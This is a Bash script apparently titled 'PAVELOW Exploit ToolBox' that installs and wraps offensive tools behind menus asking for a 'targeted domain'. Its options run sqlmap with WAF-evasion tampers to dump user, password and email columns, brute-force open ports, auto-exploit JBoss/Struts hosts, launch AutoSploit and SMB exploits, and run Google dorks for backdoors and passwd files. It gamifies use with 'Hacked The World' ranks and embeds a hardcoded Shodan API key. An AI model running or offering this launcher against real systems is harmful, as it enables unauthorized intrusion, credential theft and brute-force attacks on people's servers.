#!/bin/sh
######################################
# colors
r='\e[1;31m'
g='\e[1;32m'
y='\e[1;33m'
b='\e[1;34m'
c='\e[1;36m'
w='\e[0;38m'
e='\e[0m'
#######################################################
#variables
BROWSER="firefox"
sqldir="/usr/share/sqlmap"
fidir="/usr/share/fimap"
joomdir="/usr/share/joomscan"
comdir="/usr/share/commix"
subdir="/usr/share/sublist3r"
sho="/usr/local/bin/shodan"
installdir="$HOME/PaveLow"
chkmark="[$gâœ”$e]"
div="$g##################################################################$e\n"
wafs="apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes"
########################################################
#GitHubs
function hubIt()
{
echo -e "$g""Installing$e: AutoSploit"
git clone https://github.com/NullArray/AutoSploit.git $installdir/autosploit;sleep 1;echo -e "\t$chkmark"
echo -e "2/2: Installing requirements.."
cd $installdir/autosploit;sleep 1;chmod +x install.sh;./install.sh;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: SQLi Scanner"
git clone https://github.com/Hadesy2k/sqliv.git $installdir/SQLiv;sleep 1;echo -e "\t$chkmark"
echo -e "2/2: Installing requirements.."
cd $installdir/SQLiv;sleep 1;python2 setup.py -i;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: Bucket Scan"
git clone https://github.com/random-robbie/AWS-Scanner.git $installdir/awscan;sleep 1;echo -e "\t$chkmark"
echo -e "2/2: Installing requirements.."
cd $installdir/awscan;sleep 1;go get github.com/fatih/color;go build main.go;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: cr3dOv3r"
git clone https://github.com/D4Vinci/Cr3dOv3r $installdir/cr3dov3r;sleep 1;echo -e "\t$chkmark"
echo -e "2/2: Installing requirements.."
cd $installdir/cr3dov3r;sleep 1;pip3 install -r requirements.txt;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: Eternal Check"
git clone https://github.com/peterpt/eternal_scanner.git $installdir/echeck;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: BruteSpray"
git clone https://github.com/x90skysn3k/brutespray.git $installdir/brute;sleep 1;echo -e "\t$chkmark"
echo -e "2/2: Installing requirements.."
cd $installdir/brute;sleep 1;pip install -r requirements.txt;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: JexBoss.."
git clone https://github.com/joaomatosf/jexboss.git $installdir/jexboss;sleep 1;echo -e "\t$chkmark"
echo -e "2/2: Installing requirements.."
cd $installdir/jexboss;sleep 1;pip install -r requires.txt;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: vBulletin Scan.."
git clone https://github.com/rezasp/vbscan.git $installdir/vbscan;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: WAScan"
git clone https://github.com/m4ll0k/WAScan.git $installdir/wascan;sleep 1;echo -e "\t$chkmark"
echo -e "2/2: Installing requirements.."
cd $installdir/wascan;sleep 1;pip install -r requirements.txt;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: Breacher"
git clone https://github.com/UltimateHackers/Breacher.git $installdir/breacher;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: Blazy.."
git clone https://github.com/UltimateHackers/Blazy.git $installdir/blazy;sleep 1;echo -e "\t$chkmark"
echo -e "2/2: Installing requirements.."
cd $installdir/blazy;sleep 1;pip install -r requirements.txt;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: OpenDoor.."
git clone https://github.com/stanislav-web/OpenDoor.git $installdir/opendoor;sleep 1;echo -e "\t$chkmark"
echo -e "2/2: Installing requirements.."
cd $installdir/opendoor;sudo python setup.py install;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: Domain Analyzer.."
git clone https://github.com/eldraco/domain_analyzer.git $installdir/domain_analyzer;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: Blazy.."
git clone https://github.com/UltimateHackers/Blazy.git $installdir/blazy;sleep 1;echo -e "\t$chkmark"
echo -e "2/2: Installing requirements.."
cd $installdir/blazy;sleep 1;pip install -r requirements.txt;sleep 1;echo -e "\t$chkmark"
echo -n -e $div
echo -e "$g""Installing$e: CMSmap.."
git clone https://github.com/Dionach/CMSmap.git $installdir/cmsmap;sleep 1;echo -e "\t$chkmark"
echo -n -e $div
echo -e "$g""Installing$e: XssPy.."
git clone https://github.com/faizann24/XssPy.git $installdir/xsspy;sleep 1;echo -e "\t$chkmark"
}
###############################################################
function ranks()
{
touch $HOME/loads.txt
file="$HOME/loads.txt"

if [ -e ${file} ]; then
    count=$(cat ${file})
else
    count=0
fi

((count++))

echo $count > $file
if [ $count -lt 30 ]; then
	TheRank="New Blood"
elif [ $count -lt 50 ]; then
	TheRank="Skid"
elif [ $count -lt 60 ]; then
	TheRank="1337 Hacker"
elif [ $count -lt 75 ]; then
	TheRank="Pentester"
elif [ $count -lt 85 ]; then
	TheRank="Cyber Security Researcher"
elif [ $count -lt 100 ]; then
	TheRank="Cyber Security Expert"
elif [ $count -lt 200 ]; then
	TheRank="Hall of Fame"
elif [ $count -lt 400 ]; then
	TheRank="Legendary"
fi
}	
#Input Menu

function menu()
{
echo -e "What's your weapon of choice?"
select UI in "Passive Scan" "Agressive Scan" "Vulnerablilty Scan" "Exploit Toolbox"
do
	case $UI in
		"Passive Scan")
			passive_menu
		;;
	        "Agressive Scan")
			ag_menu			
		;;
		"Vulnerablilty Scan")
			vuln_menu
		;;
		"Exploit Toolbox")
			exploitHub		
		;;
		
		*)
			echo -e "Lel, really? Try again"
			menu
		;;
	esac
	break
done < /dev/tty
}
########################################################
#Agressive Menu
function ag_menu()
{
echo
clear
echo -e "$g################$e[-$r""Agressive Recon$e-]$g#################$e"
echo -e "$y""Please select which option you would like to use$e: "
select ag_type in "Home" "Open Dir search" "DNS Scan" "Subtakeover" "Port Scan" "Admin Finder" "DNS Misconfig" "Bucket Scan"
do
	case $ag_type in
		"Home")
			clear
			banner
			menu
		;;
	        "Bucket Scan")
			echo -e "What's the targeted domain:\t"
			read  bucket_url
			( echo "${bucket_url}" > $installdir/awscan/list.txt )
			( cd $installdir/awscan;./main )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"Subtakeover")
			echo -e "What's the $r""target$e""ed $r""domain$e?:\t"
			read targ_d
			echo -e "Fair warning - This is a pretty lengthy proccess, but worth it!" | grep --color 'Fair warning - This is a pretty lengthy proccess, but worth it!'
			sleep 1
			echo -n -e $div
			( aquatone-discover -d $targ_d --threads 100 )
			echo -n -e $div
			sleep 0.5
			( aquatone-takeover -d $targ_d --threads 100 )	
			echo -n -e $div
			sleep 0.5
			menu
		;;
		"Port Scan")
			echo -e "What's the targeted domain/IP?:\t"
			read targ_ip
			echo -e $div
			( nmap -v -Pn --open $targ_ip )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"Admin Finder")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read find_admin
			sleep 1
			cd $installdir/breacher
			echo -n -e $div
			( python breacher.py -u $find_admin )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"Open Dir search")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read find_dirs
			sleep 1
			cd $installdir/opendoor
			echo -n -e $div
			( python3 opendoor.py --host $find_dirs --threads 50 )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"DNS Scan")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read scan_url
			sleep 1
			cd $installdir/domain_analyzer
			echo -n -e $div
			( python domain_analyzer.py --domain $scan_url )
			trap INT
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"DNS Misconfig")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read config_input
			echo -e "Fair warning - This is a pretty lengthy proccess, but worth it!" | grep --color 'Fair warning - This is a pretty lengthy proccess, but worth it!'
			sleep 1
			echo -n -e $div
			( fierce -dns $config_input )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			banner
			menu	
		;;
		

		*)
			echo -e "Lel, really? Try again"
			menu
		;;
	esac
done
}
########################################################
#Passive Menu
function passive_menu()
{
echo
clear
echo -e "$g################$e[-$r""Passive Menu$e-]$g#################$e"
echo -e "$y""Please select which option you would like to use$e: "
select recon_type in "Home" "Dork OSINT" "Email Harvest" "Subdomain Gather" "WAF Detect" "Shodan Lurk" "Domain BG Check" "HIBP & PW Reuse Check"
do
	
	case $recon_type in
		"Home")
			clear
			banner
			menu
		;;
		"HIBP & PW Reuse Check")
			echo -e "What's the $r""target$e""ed $r""email$e?:"
			read emailcheck
			echo -n -e $div	
		        ( cd $installdir/cr3dov3r;python3 Cr3d0v3r.py ${emailcheck} )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu		    
			
		;;
		"Dork OSINT")
		 	echo -e "$c---->$e $r""WARNING:$e $y""This will open up new tabs in firefox to provide results""$e! $c<----$e"
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read TARGET
			echo -n -e $div	
        		sleep 1
			OSINT_G
		;;
		"Domain BG Check")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read webcheck
			echo -n -e $div	
		        ( whatweb -v $webcheck )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu		    
			
		;;
		"Shodan Lurk")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read sho_ip
			echo -n -e $div
			ip=$(resolveip -s $sho_ip)
			echo -e "checking host: [$ip]"	    					
			( shodan host $ip )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu		    
		;;
		"Email Harvest")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read targ_email
			echo -n -e $div			    
			( theharvester -d $targ_email -l 30 -b all )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			

		;;
		"Subdomain Gather")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read targ_domain
			echo -n -e $div		    
			( sublist3r -d $targ_domain )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
 		"WAF Detect")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read WAF_url
			echo -n -e $div
			( wafw00f $WAF_url )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		
		*)
			echo -e "Lel, really? Try again"
			menu
		;;
	esac
done
}
########################################################
#Exploit Hub
function exploitHub()
{
echo
clear
echo -e "$g################$e[-$r""Exploit Hub$e-]$g#################$e"
echo -e "$c""Please select which option you would like to use$e:"
select ex_type in "Home" "MySQLi Dumper" "Admin Bypasser" "Struts/JMX2Shell" "LFI" "Port Bruter" "IOT Exploiter" "SMB Exploiter"
do
	case $ex_type in
		"Home")
			clear
			banner
			menu
		;;
		"SMB Exploiter")
			echo -n -e $div
			cd $installdir/echeck
			( escan )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu	
		;;
		"IOT Exploiter")
			echo -n -e $div
			cd $installdir/autosploit
			( python autosploit.py )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu	
		;;
		"MySQLi Dumper")
			echo -e "What's the $r""vulnerable URL$e($b""ex: www.aol.com/index.php?id=30$e):\t"
			read dump_sqli
			sleep 1
			echo -n -e $div
			( sqlmap -u $dump_sqli --threads 10 --random-agent --ignore-proxy --eta --batch --search -C user,pass,email  )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu	
		;;
		"Port Bruter")
			echo -e "**$r""This scan will take a few moments, as we'll gather open ports, then export and brute.$e\n"
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read brute_ip
			echo -e "$c""Verifying domain$e:\t[${brute_ip}$e]\t${chkmark}"
			echo -n -e $div
			cd $installdir/brute
			ip=$(resolveip -s $brute_ip)
			( nmap -sV --open -oX $installdir/bf_it.xml $brute_ip )
			sleep 1
			echo -e "$c""Verifying IP$e:\t[${brute_ip}$e]\t${chkmark}"
			echo -e "$r""1/2#$e: [$g""$brute_ip"$e"] saved as: $installdir/bf_it.xml"
			echo -n -e $div
			echo -e "$r""2/2$e: $b""bruteforcing open ports on: [$g""$brute_ip"$e"]"
			( python brutespray.py -f $installdir/bf_it.xml )
			echo -n -e $div			
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu	
		;;
		"Admin Bypasser")
			cd $installdir/blazy
			echo -n -e $div
			( python blazy.py )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"Struts/JMX2Shell")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read rce_shell
			sleep 1
			cd $installdir/jexboss
			echo -n -e $div
			( python jexboss.py -u $rce_shell )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"LFI")
			echo -e "What's the $r""vulnerable URL$e($b""ex: www.google.com/file.path=$e):\t"
			read lfi_vuln
			sleep 1
			echo -n -e $div $r
			( fimap -u $lfi_vuln --force-run )
			echo -n -e $e$div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		
		*)
			echo -e "Lel, really? Try again"
			menu
		;;
	esac
done
}
########################################################
#Vulnerability Menu
function vuln_menu()
{
echo
clear
echo -e "$g################$e[-$r""Vulnerability Lab$e-]$g#################$e"
echo -e "$y""Please select which option you would like to use$e: "
select ag_type in "Home" "SQLi Dorker" "XSS Crawler" "CMS Scan" "WPScan" "Joomla Scanner" "vBulletin Scan" "SQLi Crawler" "LFI Crawler" "Extensive Scan"
do
	
	case $ag_type in
		"Home")
			clear
			banner
			menu
		;;
		"vBulletin Scan")
			echo -e "What's the $r""domain$e:\t"
			read vBURL
			sleep 1
			echo -n -e $div $r
			( cd $installdir/vbscan;perl vbscan.pl $vBURL)
			echo -n -e $e$div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu
		;;
		"LFI Crawler")
			echo -e "What's the $r""domain$e:\t"
			read lfi_vuln
			sleep 1
			echo -n -e $div $r
			( fimap -u "http://"$lfi_vuln -4 )
			echo -n -e $e$div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu
		;;		
		"Extensive Scan")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read check_url
			echo -n -e $div $r
			cd $installdir/wascan;sleep 1
			( python wascan.py --url "http://"${check_url} -s 1 )
			echo -n -e $e$div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu
		;;
		"Joomla Scanner")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read check_joom
			echo -n -e $div 
			( joomscan -u $check_joom )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"SQLi Dorker")
			echo -e "What's the $r""google$e"" $r""dork$e?:\t"
			read sqlidork
			echo -n -e $div $r
			( sqliv -d "$sqlidork" -e google )
			echo -n -e $e$div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"SQLi Crawler")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read targ_sqli
			echo -e "Fair warning - This is a pretty lengthy proccess, but worth it!" | grep --color 'Fair warning - This is a pretty lengthy proccess, but worth it!'
			echo -e "$c"checking domain..$e"[$w$targ_sqli$e]"
			echo -n -e $div
			( sqlmap -u "http://"${targ_sqli} --random-agent --ignore-proxy --threads 5 --risk 3 --level 2 --forms --crawl 4 --tamper $wafs --batch )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"XSS Crawler")
			echo -e "What's the $r""target$e""ed $r""domain$e?(only domain.com):\t"
			read find_xss
			sleep 1
			cd $installdir/xsspy
			echo -n -e $div
			( python XssPy.py -u $find_xss -e )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"RCE Check")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read find_rce
			sleep 1
			cd $installdir/jexboss
			echo -n -e $div	
			( python jexboss.py -u $find_rce --auto-exploit )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu	
		;;
		"CMS Scan")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read find_cms
			sleep 1
			cd $installdir/cmsmap
			echo -n -e $div $r
			( python cmsmap.py -t $find_cms)
			echo -n -e $div $e
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;
		"WPScan")
			echo -e "What's the $r""target$e""ed $r""domain$e?:"
			read find_wp
			sleep 1
			echo -n -e $div
			( wpscan --url $find_wp --random-agent --threads 30 )
			echo -n -e $div
			echo -e "$r""w00t!$e..finished!"
			sleep 0.5
			menu			
		;;

		*)
			echo -e "Lel, really? Try again"
			menu
		;;
	esac
done
}
########################################################
function banner()
{
echo -e "$r##################################################################$e"
cat<<"EOT"
                                                ,--,                                  
,-.----.                                       ,---.'|       ,----..                    
\    /  \     ,---,                      ,---,.|   | :      /   /   \             .---. 
|   :    \   '  .' \            ,---.  ,'  .' |:   : |     /   .     :           /. ./| 
|   |  .\ : /  ;    '.         /__./|,---.'   ||   ' :    .   /   ;.  \      .--'.  ' ; 
.   :  |: |:  :       \   ,---.;  ; ||   |   .';   ; '   .   ;   /  ` ;     /__./ \ : | 
|   |   \ ::  |   /\   \ /___/ \  | |:   :  |-,'   | |__ ;   |  ; \ ; | .--'.  '   \' . 
|   : .   /|  :  ' ;.   :\   ;  \ ' |:   |  ;/||   | :.'||   :  | ; | '/___/ \ |    ' ' 
;   | |`-' |  |  ;/  \   \\   \  \: ||   :   .''   :    ;.   |  ' ' ' :;   \  \;      : 
|   | ;    '  :  | \  \ ,' ;   \  ' .|   |  |-,|   |  ./ '   ;  \; /  | \   ;  `      | 
:   ' |    |  |  '  '--'    \   \   ''   :  ;/|;   : ;    \   \  ',  /   .   \    .\  ; 
:   : :    |  :  :           \   `  ;|   |    \|   ,/      ;   :    /     \   \   ' \ | 
|   | :    |  | ,'            :   \ ||   :   .''---'        \   \ .'       :   '  |--"  
`---'.|    `--''               '---" |   | ,'                `---`          \   \ ;     
  `---`                              `----'                                  '---"      
EOT
ranks
cat $installdir/user.txt | while read user
do
echo -e "$c\t\t\t#AnonyInfo$e:"$r"d3f$e $g-$e $c""x3c"$e $g-$e "$y""nulld3v\n\t\t\t\t   $b@AnonyInfo$e"
echo -e "$g##############################################################################$e"
echo -e "$g#$e\t"$r"W$e""elcome$e $c""B"$e"ack, $r"$user"$e\t		      	                     $g#$e"
echo -e "$g#$e\t$c""H"$e"acked $r""T"$e"he $c""W"$e"orld$e: $r${count}$e"" $c""t"$e"imes\t\t\t\t\t     $g#$e"
echo -e "$g#$e\t$r""E"$e"xploiter $c""R"$e"ank$e: $r${TheRank}$e$g\t\t\t	     $g#$e"
echo -e "$g##############################################################################$e"
done
sleep 1.0
}
####################################################################################
#OSINT Google:
function OSINT_G()
{
$BROWSER 2> /dev/null &
sleep 5

# LOAD WEBSITE IN A WEB BROSER
$BROWSER http://$TARGET 2> /dev/null
$BROWSER https://$TARGET 2> /dev/null
# TCPUTILS
$BROWSER http://www.tcpiputils.com/browse/domain/$TARGET 2> /dev/null
# NETCRAFT
$BROWSER http://toolbar.netcraft.com/site_report?url=$TARGET 2> /dev/null
# SHOWDAN
$BROWSER https://www.shodan.io/search?query=$TARGET 2> /dev/null
# CENSYS
$BROWSER https://www.censys.io/ipv4?q=$TARGET 2> /dev/null
# CRT.SH
$BROWSER https://crt.sh/?q=%25.$TARGET 2> /dev/null
# ZONE-H
$BROWSER "https://www.google.ca/search?q=site:zone-h.org+$TARGET" 2> /dev/null
# XSSPOSED
$BROWSER "https://www.xssposed.org/search/?search=$TARGET&type=host" 2> /dev/null
# PUNKSPIDER
$BROWSER "https://securityheaders.io/?q=$TARGET" 2> /dev/null
# SSLLABS
$BROWSER https://www.ssllabs.com/ssltest/analyze.html?d=$TARGET 2> /dev/null
# HEADER CHECK
$BROWSER https://securityheaders.io/?q=$TARGET 2> /dev/null

sleep 30

# FIND LOGIN PAGES:
$BROWSER "https://www.google.ca/search?q=site:$TARGET+username+OR+password+OR+login+OR+root+OR+admin" 2> /dev/null
# SEARCH FOR BACKDOORS:
$BROWSER "https://www.google.ca/search?q=site:$TARGET+inurl:shell+OR+inurl:backdoor+OR+inurl:wso+OR+inurl:cmd+OR+shadow+OR+passwd+OR+boot.ini+OR+inurl:backdoor" 2> /dev/null
# FIND SETUP OR INSTALL FILES:
$BROWSER "https://www.google.ca/search?q=site:$TARGET+inurl:readme+OR+inurl:license+OR+inurl:install+OR+inurl:setup+OR+inurl:config" 2> /dev/null
# FIND WORDPRESS PLUGINS/UPLOADS/DOWNLOADS:
$BROWSER "https://www.google.ca/search?q=site:$TARGET+inurl:wp-+OR+inurl:plugin+OR+inurl:upload+OR+inurl:download" 2> /dev/null
# FIND OPEN REDIRECTS:
$BROWSER "https://www.google.ca/search?q=site:$TARGET+inurl:redir+OR+inurl:url+OR+inurl:redirect+OR+inurl:return+OR+inurl:src=http+OR+inurl:r=http" 2> /dev/null
# FIND FILES BY EXTENSION:
$BROWSER "https://www.google.ca/search?q=site:$TARGET+ext:cgi+OR+ext:php+OR+ext:asp+OR+ext:aspx+OR+ext:jsp+OR+ext:jspx+OR+ext:swf+OR+ext:fla+OR+ext:xml" 2> /dev/null
# FIND DOCUMENTS BY EXTENSION:
$BROWSER "https://www.google.ca/search?q=site:$TARGET+ext:doc+OR+ext:docx+OR+ext:csv+OR+ext:pdf+OR+ext:txt+OR+ext:log+OR+ext:bak" 2> /dev/null
# FIND APACHE STRUTS RCE's:
$BROWSER "https://www.google.ca/search?q=site:$TARGET+ext:action+OR+struts" 2> /dev/null
# FIND PASTEBIN POSTS FOR DOMAIN:
$BROWSER "https://www.google.ca/search?q=site:pastebin.com+$TARGET" 2> /dev/null
# FIND EMPLOYEES ON LINKEDIN:
$BROWSER "https://www.google.ca/search?q=site:linkedin.com+employees+$TARGET" 2> /dev/null
}
####################################################################################

function check_tools() 
{
echo -e "$g##################################################################$e"
echo -e "$r""This may take some time.. $e($y""Note: You'll be alerted when installing missing tools$e)"
echo -n -e $div
clear
echo -n -e $div
clear
echo -e "$g""checking for Shodan..$e"
if [ ! -d "$sho" ]; then
  echo -e "Shodan CLI's missing: $g""Installing now.$e"
  pip install shodan
  skey="UG4gUxpipAV34IA8bPAh397ddiYgwyoi"
  sleep 2
  ( shodan init $skey )
else
    sleep 0.5;echo -e "...$chkmark"
fi
echo -n -e $div
  echo -e "$g""checking for SQLmap$e"
if [ ! -d "$sqldir" ]; then 
  echo -e "SQLMap's missing: $g""Installing now.$e"
     sudo apt-get install sqlmap -y
else
    sleep 0.5;echo -e "...$chkmark"
fi
clear
echo -n -e $div
clear
echo -e "$g""checking for SQLmap$e"
if [ ! -d "$sqldir" ]; then 
  echo -e "SQLMap's missing: $g""Installing now.$e"
     sudo apt-get install sqlmap -y
else
    sleep 0.5;echo -e "...$chkmark"
fi
clear
echo -n -e $div
echo -e "$g""checking for fimap$e"
if [ ! -d "$fidir" ]; then 
  echo -e "FiMap's missing: $g""Installing now.$e"
     sudo apt-get install fimap -y
else
    sleep 0.5;echo -e "...$chkmark"
fi
echo -n -e $div
echo -e "$g""checking for joomscan$e.."
if [ ! -d "$joomdir" ]; then
echo -e "Joomscan's missing: $g""Installing now.$e"
sudo apt-get install joomscan
else
    sleep 0.5;echo -e "...$chkmark"
fi
clear
echo -n -e $div
echo -e "$g""checking for sublist3r$e.."
if [ ! -d "$subdir" ]; then
echo -e "Sublist3r's missing: $g""Installing now$e."
sudo apt-get install sublist3r
else
    sleep 0.5;echo -e "...$chkmark"
fi
echo -n -e $div
echo -e "$g""checking for commix$e.."
if [ ! -d "$comdir" ]; then
echo -e "Sublist3r's missing: $g""Installing now$e."
sudo apt-get install sublist3r
else
    sleep 0.5;echo -e "...$chkmark"
fi
echo -n -e $div
echo -e "$g""Installing$e: Gems & Aquatone.."
gem install snmp
gem install pcaprub
gem install rake
gem install bettercap
gem install aquatone;sleep 1;echo -e "\t$chkmark"
clear
echo -n -e $div
echo -e "$g""Installing$e: SMB/Eternal dependencies.."
apt-get install masscan python-crypto python-impacket python-pyasn1-modules
pip install crypto && pip install impacket && pip install pyasn1-modules
echo -n -e $div
clear
echo -n -e $div
echo -e "$g""Installing$e: GOLang"
apt-get install golang -y
echo -n -e $div
hubIt
echo -n -e $div
echo -e "Finished! "
sleep 1
banner
menu
}
#######Check for 1st run############
#User Set / System Check
function wnmap() 
{
which nmap > /dev/null 2>&1
if [ "$?" != 0 ]; then
	echo -e "\t\t$r[!]$e ut oh, no Nmap! We'll fix that!"
	inmap
	else
            echo -e "\t\t$g[+]$e Nice, Nmap's already installed."
fi
}
##################
function inmap() 
{
echo -e "$g[i]$e Installing nmap... please wait..."
apt-get install nmap > /dev/null 2>&1
if [ "$?" != 0 ]; then
	echo -e "\t\t$r[!]$e Nmap not installed... please try again or check your connection.."
	exit 1
else
    echo -e "\t\t$g[+]$e Nmap is installed..."
fi
}
#################
function rCheck() 
{
	if [ $(id -u) != "0" ]; then
		echo -e "\t\t$r[!]$e Please run this script with root user!"
		exit 1
	else
	    echo -e "\t\t$g[+]$e Perfect! You're root user!"
	fi
}
function connect() 
{
	ping -c 1 -w 3 google.com > /dev/null 2>&1
	if [ "$?" != 0 ]; then
		echo -e "\t\t$r[!]$e This script needs an active internet connection!"
		exit 1
	else
	    echo -e "\t\t$g[+]$e Internet connection looks ok."
	fi
}
####################
function sysCheck()
{
clear
echo -e "$r##################################################################$e"
cat<<"EOT"
         _nnnn_                      
        dGGGGMMb     ,"""""""""""""".
       @p~qp~~qMb    |  #PAVELOW    |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--'
EOT
echo -e "\t\tWelcome to PAVELOW Exploit ToolBox - Lets set up shop!"
echo -e "$r##################################################################$e"
echo -e "\t\t$r[!]$e Checking for $g""root$e.."
sleep 1
rCheck
echo -e "\t\t$r[!]$e Checking for $g""internet connection$e.."
sleep 1
connect
echo -e "\t\t$r[!]$e Checking for $g""NMAP$e.."
sleep 1
wnmap
sleep 1
echo -e "$c\t\tokay so what do we call you?\t"
read userHandle
echo "$userHandle" > $installdir/user.txt
cat $installdir/user.txt | while read USERID
do
     echo -e "Ah, sup $r""${USERID}$e - Brb "$g"installing$e this beast for you$r!$e"
     sleep 1
     sudo apt-get install python-elixir pyPdf sublist3r -y
     check_tools
done

}
#########################################################
function check_use()
{
echo -e "\t\t$r[!]$e Checking for previous usage$e.."
sleep 0.6
if [ ! -d $installdir ]; then
     cd $HOME;sudo mkdir $installdir
     cd $installdir;touch user.txt
     echo -n -e $div
     sleep 1
     echo -e "\t\tAha, welcome! Being this is your first run we'll need to set a few things up first" | grep --color "Aha, welcome! Being this is your first run we'll need to set a few things up first"
     echo -n -e $div
     sysCheck
     sleep 0.5
elif [ -d $installdir ]; then
echo -e "$c\t\t$chkmark: everything's $g""good$e! let's get started$e!\n"
clear
echo
banner
menu
fi
}
######################################
echo -e "$r##################################################################$e"
cat<<"EOT"
         _nnnn_                      
        dGGGGMMb     ,"""""""""""""".
       @p~qp~~qMb    |  #PAVELOW    |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--'
EOT
echo -e "\t\tWelcome to PAVELOW Exploit ToolBox"
echo -e "$r##################################################################$e"
check_use
